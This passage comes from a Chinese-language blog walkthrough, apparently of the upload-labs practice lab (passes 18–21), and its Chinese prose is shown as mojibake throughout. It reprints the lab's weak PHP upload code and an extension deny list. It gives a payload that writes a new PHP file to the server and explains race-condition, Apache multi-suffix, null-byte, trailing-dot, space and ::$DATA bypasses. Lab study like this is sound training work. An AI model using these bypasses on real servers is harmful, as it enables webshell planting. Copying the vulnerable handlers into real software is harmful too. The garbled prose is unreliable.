?&gt;&#39;);?&gt;</code>çš„phpæ–‡ä»¶ï¼Œå†ä¸æ–­è®¿é—®ä¸Šä¼ æ–‡ä»¶è¾¾æˆè§£æçš„ç›®çš„ã€‚</p><p>è§£ææˆåŠŸçš„è¯å°±èƒ½åœ¨åŒç›®å½•ä¸‹å†™å…¥ä¸€ä¸ªåŒ…å«<code>&lt;?php phpinfo(); ?&gt;</code>çš„info.phpæ–‡ä»¶äº†</p><h3 id="bypass-17"><a href="#bypass-17" class="headerlink" title="bypass"></a>bypass</h3><p>æ¡ä»¶ç«äº‰ï¼šï¼ˆå¤šçº¿ç¨‹ã€åŒæ—¶ã€åŒä¸€ä¸ªæ–‡ä»¶ï¼‰</p><p>å‘ç”Ÿåœ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®åŒä¸€ä¸ªå…±äº«ä»£ç ã€å˜é‡ã€æ–‡ä»¶ç­‰æ²¡æœ‰è¿›è¡Œé”æ“ä½œæˆ–è€…åŒæ­¥æ“ä½œçš„åœºæ™¯ä¸­</p><p>ç”±æ­¤è¿›è¡Œbypass</p><p>1ã€æŠ“ä¸Šä¼ åŒ…å’Œè®¿é—®åŒ…ï¼›å¹¶å‘é€åˆ°intruderæ¨¡å—</p><p><img src="https://i.loli.net/2021/02/13/3Uwh12sjIaq6Hgf.png"><img src="https://i.loli.net/2021/02/13/Dkfr7MCcu1eOyTL.png"></p><p>2ã€åˆ©ç”¨intruderé‡å¤å‘é€ã€è®¿é—®ï¼Œä»è€Œè¾¾æˆè§£æä¸Šä¼ æ–‡ä»¶çš„ç›®çš„~</p><p>åœ¨urlä¸­æ·»åŠ å‚æ•°a=1ï¼ˆä½œä¸ºpayloadçš„æ”»å‡»å‚æ•°ï¼‰ï¼Œpayloadé€‰æ‹©numeberè¾“ä¸ªåˆé€‚çš„èŒƒå›´å°±å¯ä»¥äº†</p><p><img src="https://i.loli.net/2021/02/13/maQlK6NdA9tCcgo.png"></p><p>å°†çº¿ç¨‹æ•°è°ƒå¤§</p><p><img src="https://i.loli.net/2021/02/13/t6T3eJYRMp1yizc.png"></p><p>çŠ¶æ€ç å›æ˜¾200ï¼Œè®¿é—®æˆåŠŸäº†ï¼Œè¯´æ˜å…¶ä¸­çš„ä»£ç è¢«æˆåŠŸè§£æ</p><p><img src="https://i.loli.net/2021/02/13/cqOZ7MaA6f2XLYy.png"></p><p>å°è¯•è®¿é—®ï¼š</p><p><img src="https://i.loli.net/2021/02/13/4vGt5wQp3dFqV8i.png"></p><p>æˆåŠŸå•¦</p><h2 id="pass19ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰-ï¼‰"><a href="#pass19ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰-ï¼‰" class="headerlink" title="pass19ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰-ï¼‰"></a>pass19ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰-ï¼‰</h2><h3 id="åˆ†æ-18"><a href="#åˆ†æ-18" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;./myupload.php&quot;</span>);<br>    <span class="hljs-variable">$imgFileName</span> =time();<br>    <span class="hljs-variable">$u</span> = <span class="hljs-keyword">new</span> MyUpload(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>],<span class="hljs-variable">$imgFileName</span>);<br>    <span class="hljs-variable">$status_code</span> = <span class="hljs-variable">$u</span>-&gt;upload(UPLOAD_PATH);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$status_code</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$u</span>-&gt;cls_upload_dir . <span class="hljs-variable">$u</span>-&gt;cls_file_rename_to;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-1</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-3</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-4</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-5</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-6</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;      <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æœªçŸ¥é”™è¯¯ï¼&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//myupload.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>&#123;<br><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_arr_ext_accepted</span> = <span class="hljs-keyword">array</span>(<br>      <span class="hljs-string">&quot;.doc&quot;</span>, <span class="hljs-string">&quot;.xls&quot;</span>, <span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;.pdf&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.zip&quot;</span>, <span class="hljs-string">&quot;.rar&quot;</span>, <span class="hljs-string">&quot;.7z&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<br>      <span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&quot;.xml&quot;</span>, <span class="hljs-string">&quot;.tiff&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span> );<br><br>  <span class="hljs-comment">/** upload()</span><br><span class="hljs-comment">   **</span><br><span class="hljs-comment">   ** Method to upload the file.</span><br><span class="hljs-comment">   ** This is the only method to call outside the class.</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@para</span> String name of directory we upload to</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@returns</span> void</span><br><span class="hljs-comment">  **/</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> <span class="hljs-variable">$dir</span> </span>)</span>&#123;<br>    <br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;isUploadedFile();<span class="hljs-comment"># åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯é€šè¿‡ HTTP POST ä¸Šä¼ çš„</span><br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;setDir( <span class="hljs-variable">$dir</span> );<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;checkExtension();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;checkSize();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );    <br>    &#125;<br>    <br>    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> )&#123;<br>      <br>      <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;checkFileExists();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );    <br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;move();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );    <br>    &#125;<br><br>    <span class="hljs-comment">// check if we need to rename the file</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;renameFile();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );    <br>      &#125;<br>    &#125;<br>      <br>    <span class="hljs-comment">// if we are here, everything worked as planned :)</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-string">&quot;SUCCESS&quot;</span> );<br>  <br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä¾æ¬¡æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€æ–‡ä»¶åæ˜¯å¦å¯å†™ã€æ£€æŸ¥åç¼€ï¼ˆç™½åå•ï¼‰ã€æ£€æŸ¥æ–‡ä»¶å¤§å°ã€æ£€æŸ¥ä¸´æ—¶æ–‡ä»¶å­˜åœ¨ã€ä¿å­˜åˆ°ä¸´æ—¶ç›®å½•é‡Œã€ç„¶åå†é‡å‘½å</p><p>ä¸pass18çš„ç›¸æ¯”ï¼Œå¢æ·»äº†æ£€æŸ¥æ–‡ä»¶åç¼€çš„wafï¼Œè¦æ±‚æ–‡ä»¶åç¼€å¿…é¡»æ˜¯ jpg | png | gif</p><h3 id="bypass-18"><a href="#bypass-18" class="headerlink" title="bypass"></a>bypass</h3><h4 id="æ¡ä»¶ç«äº‰ï¼ˆé‡å‘½åï¼‰-å›¾ç‰‡é©¬-æ–‡ä»¶åŒ…å«"><a href="#æ¡ä»¶ç«äº‰ï¼ˆé‡å‘½åï¼‰-å›¾ç‰‡é©¬-æ–‡ä»¶åŒ…å«" class="headerlink" title="æ¡ä»¶ç«äº‰ï¼ˆé‡å‘½åï¼‰+ å›¾ç‰‡é©¬ + æ–‡ä»¶åŒ…å«"></a>æ¡ä»¶ç«äº‰ï¼ˆé‡å‘½åï¼‰+ å›¾ç‰‡é©¬ + æ–‡ä»¶åŒ…å«</h4><p>ä¸Šä¼ å›¾ç‰‡ğŸï¼Œåˆ©ç”¨include.phpæ–‡ä»¶åŒ…å«å†™å…¥shell</p><p>è¿™é‡Œæƒ³è¦è§£æå›¾ç‰‡ğŸéœ€è¦åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½¿ç”¨è‡ªå¸¦çš„include.phpå°±è¡Œäº†</p><p>å›¾ç‰‡ğŸæ’å…¥è¯­å¥ä»ä¸ºï¼š<code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); ?&gt;&#39;);?&gt;</code></p><p>åƒpass18ä¸€æ ·ï¼ŒæŠ“ä¸Šä¼ åŒ…å’Œè®¿é—®åŒ…ä¸æ–­é‡å‘ï¼Œåˆ©ç”¨é‡å‘½åçš„æ—¶é—´å·®å³å¯æˆåŠŸè®¿é—®æ–‡ä»¶</p><p>ï¼ˆè¿™é‡Œå¯èƒ½æºç æœ‰é—®é¢˜ï¼Œuploadå’Œæ–‡ä»¶åå°‘äº†/ï¼›å¦‚upload/compare.jpgå˜æˆäº†uploadcompare.jpg;è®¿é—®çš„æ—¶å€™æ³¨æ„ä¸€ä¸‹ï¼‰</p><p><img src="https://i.loli.net/2021/02/13/N1qoDxCHAzZkT6a.png"></p><p>å¯ä»¥çœ‹åˆ°infoè¢«æˆåŠŸå†™å…¥äº†ï¼Œè®¿é—®å³å¯</p><p><img src="https://i.loli.net/2021/02/13/eKmtIRpy3aj2XkP.png"></p><h4 id="æ¡ä»¶ç«äº‰ï¼ˆé‡å‘½åï¼‰-åˆ©ç”¨apacheè§£ææ¼æ´"><a href="#æ¡ä»¶ç«äº‰ï¼ˆé‡å‘½åï¼‰-åˆ©ç”¨apacheè§£ææ¼æ´" class="headerlink" title="æ¡ä»¶ç«äº‰ï¼ˆé‡å‘½åï¼‰+ åˆ©ç”¨apacheè§£ææ¼æ´"></a>æ¡ä»¶ç«äº‰ï¼ˆé‡å‘½åï¼‰+ åˆ©ç”¨apacheè§£ææ¼æ´</h4><p>å®˜æ–¹ç¯å¢ƒè¦æ±‚ä½¿ç”¨çš„apacheç‰ˆæœ¬ä¸º2.4.10ï¼›å¯ä»¥ä½¿ç”¨apacheè§£ææ¼æ´</p><blockquote><p>apacheè§£ææ¼æ´ï¼š<br>Apacheé»˜è®¤ä¸€ä¸ªæ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªä»¥ç‚¹.åˆ†å‰²çš„åç¼€ï¼Œå½“å³è¾¹çš„åç¼€æ— æ³•è¯†åˆ«ï¼Œåˆ™ç»§ç»­å‘å·¦è¯†åˆ«ï¼Œå‘ç°åç¼€æ˜¯php,äº¤ä¸ªphpå¤„ç†è¿™ä¸ªæ–‡ä»¶ã€‚ï¼ˆå³ä»å³å‘å·¦è¯†åˆ«ï¼Œé‡åˆ°æ— æ³•æ— æ³•è¯†åˆ«çš„åç¼€åˆ™è·³è¿‡ï¼‰</p></blockquote><p>å› æ­¤æˆ‘ä»¬å¯ä»¥ä¸Šä¼ åç¼€ä¸º<code>.php.jpg</code>çš„æ–‡ä»¶ï¼Œç„¶åä¸æ–­è®¿é—®<code>xxx.php.jpg</code>å³å¯è§£æ</p><p>è¯¥æ–‡ä»¶æ’å…¥è¯­å¥ä»ä¸ºï¼š<code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); ?&gt;&#39;);?&gt;</code></p><p>è§£æåç”Ÿæˆinfo.phpåœ¨åŒç›®å½•ä¸‹ï¼Œè®¿é—®å³å¯</p><p>ï¼ˆä¼¼ä¹ç›´æ¥ä»¥è¯¥æ–‡ä»¶ä½œä¸ºğŸæ¥è¿æ¥ä¹Ÿå¯ä»¥ï¼Ÿï¼‰</p><h2 id="pass20ï¼ˆé»‘åå•ï¼‰"><a href="#pass20ï¼ˆé»‘åå•ï¼‰" class="headerlink" title="pass20ï¼ˆé»‘åå•ï¼‰"></a>pass20ï¼ˆé»‘åå•ï¼‰</h2><h3 id="åˆ†æ-19"><a href="#åˆ†æ-19" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p><img src="https://i.loli.net/2021/02/13/xMJU9omDzHsjWB8.png"></p><p>å…è®¸æˆ‘ä»¬è‡ªå®šä¹‰æ–‡ä»¶åï¼Œä½†å­˜åœ¨é»‘åå•ï¼Œæ— æ³•ç›´æ¥ä¸Šä¼ phpè¿™äº›åç¼€</p><p>tipsï¼šæœ¬passçš„å–æ–‡ä»¶åé€šè¿‡$_POSTæ¥è·å–ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>       <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>       <span class="hljs-variable">$file_ext</span> = pathinfo(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);<br></code></pre></td></tr></table></figure><h3 id="bypass-19"><a href="#bypass-19" class="headerlink" title="bypass"></a>bypass</h3><p>ä¹‹å‰é»‘åå•ç»•è¿‡çš„å¤§éƒ¨åˆ†å§¿åŠ¿éƒ½å¯ä»¥ç”¨ä¸Š,æ¯”å¦‚å¤§å°å†™ç»•è¿‡å•¥çš„éƒ½å¯ä»¥</p><h4 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="00æˆªæ–­"></a>00æˆªæ–­</h4><p>å…·ä½“åŸç†çœ‹pass13ï¼Œ00æˆªæ–­è¦æ³¨æ„ç‰ˆæœ¬</p><p><img src="https://i.loli.net/2021/02/13/zq2xaVO5isE4keb.png"></p><p>è®¿é—®å³å¯~</p><p><img src="https://i.loli.net/2021/02/13/rRmhWJ9s4BSKAtI.png"></p><h4 id="â€œ-â€ç‚¹å·ç»•è¿‡"><a href="#â€œ-â€ç‚¹å·ç»•è¿‡" class="headerlink" title="â€œ.â€ç‚¹å·ç»•è¿‡"></a>â€œ.â€ç‚¹å·ç»•è¿‡</h4><p>windowsä¸­phpä¼šè‡ªåŠ¨å»é™¤åç¼€åä¸­æœ€åçš„ â€œ.â€ çš„ç¬¦å·</p><p><img src="https://i.loli.net/2021/02/13/BP9pRLf74Ss8UKN.png"></p><h4 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h4><p><img src="https://i.loli.net/2021/02/13/7nwLtzky4pdb68a.png"></p><h4 id="DATAç»•è¿‡"><a href="#DATAç»•è¿‡" class="headerlink" title="::$DATAç»•è¿‡"></a>::$DATAç»•è¿‡</h4><p><img src="https://i.loli.net/2021/02/13/H1NB3Jq8aoP42Vb.png"></p><h2 id="pass21ï¼ˆç™½åå•-æºè‡ªCTFä»£ç å®¡è®¡ï¼‰"><a href="#pass21ï¼ˆç™½åå•-æºè‡ªCTFä»£ç å®¡è®¡ï¼‰" class="headerlink" title="pass21ï¼ˆç™½åå•-æºè‡ªCTFä»£ç å®¡è®¡ï¼‰"></a>pass21ï¼ˆç™½åå•-æºè‡ªCTFä»£ç å®¡è®¡ï¼‰</h2><h3 id="åˆ†æ-20"><a href="#åˆ†æ-20" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æºè‡ªCTF-ä»£ç å®¡è®¡ä¸€æ³¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//æ£€æŸ¥MIMEï¼›ä¿®æ”¹Content-Typeå³å¯bypass</span><br>    <span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//æ£€æŸ¥æ–‡ä»¶å</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$file</span>)) &#123;<span class="hljs-comment">#éæ•°ç»„åˆ™ç”¨explode(&#x27;.&#x27;, strtolower($file))åˆ†å‰²ä¸ºæ•°ç»„ï¼ˆä»¥ . åˆ†å‰²ï¼‰</span><br>            <br>            <span class="hljs-variable">$file</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower(<span class="hljs-variable">$file</span>));<span class="hljs-comment">#å³åˆ©ç”¨ . å°†æ–‡ä»¶åå’Œåç¼€åˆ†ç¦»ï¼Œæ–¹ä¾¿åç»­æ“ä½œ</span><br>  <span class="hljs-comment">#explode() è¿”å›ç”±å­—ç¬¦ä¸²ç»„æˆçš„æ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æ˜¯stringçš„ä¸€ä¸ªå­ä¸²ï¼Œå®ƒä»¬è¢«å­—ç¬¦ä¸²delimiterä½œä¸ºè¾¹ç•Œç‚¹åˆ†å‰²å‡ºæ¥ </span><br>        <br>        &#125;<br><br>        <span class="hljs-variable">$ext</span> = end(<span class="hljs-variable">$file</span>);<span class="hljs-comment">#å–æ–‡ä»¶åç¼€ï¼Œå³æ•°ç»„æœ€åä¸€ä¸ªï¼ˆend()å‡½æ•°ï¼‰</span><br>        <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<span class="hljs-comment">#åˆ¤æ–­åç¼€æ˜¯å¦ä¸ºjpg|png|gifï¼›</span><br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span 